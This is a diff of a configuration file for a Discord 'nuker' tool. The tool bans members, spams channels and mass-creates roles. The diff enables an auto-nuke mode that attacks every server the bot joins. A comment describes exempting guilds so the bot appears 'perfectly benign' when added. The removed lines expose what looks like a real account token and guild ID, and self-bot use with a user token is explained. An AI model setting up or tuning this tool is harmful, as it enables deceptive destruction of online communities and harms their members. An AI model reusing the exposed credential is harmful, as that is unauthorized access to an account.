@@ -1,7 +1,7 @@
 # DO NOT delete keys from this config file. Set them as false or, if array type, leave array empty
-guildID="911848377371734026"
+guildID=""
 # If you want to self bot, just put your token here. if you want to use a bot, prepend your token with "Bot "
-token="OTA3NDA3ODg2MTM1NzQyNDc1.GZ_Ope.QJcYIMox01guXexV4CTGH6BMiAixz62uANE_t8"
+token=""
 
 # If set to false, the nuker will not kick or ban any members, no matter the value of ban_members
 [feature_config]
@@ -14,7 +14,7 @@ auto_admin=["911849994020085820"]
 # Auto nuke also gives the option to nuke all currently joined servers upon startup
 # This requires the program running persistently. The guildID property has no effect when auto nuke is enabled
 [feature_config.auto_nuke]
-enabled=false
+enabled=true
 # These guilds will not be nuked by auto nuker, giving the apperance of a perfectly benign bot if added
 exempt_guilds=[]
 # Probably more useful than exempt guilds. auto nuker will only nuke these guilds on join, making it on a sort of standby until activated
@@ -30,14 +30,12 @@ exempt=[]
 # Create channels that you spam a message in after banning members
 [feature_config.after_channels]
 enabled=true
-message="Nuked by sus"
-channel_name="new-nuke"
+message="Nuked by bot"
+channel_name="botnuke"
 message_repetitions=3
 channel_amount=10
 [feature_config.role_spam]
 enabled=true
 role_name="Haccernuke nuke role"
-# If set, nuke will choose a random name from theese
-role_names=[]
 role_color=0x007493
 role_amount=10
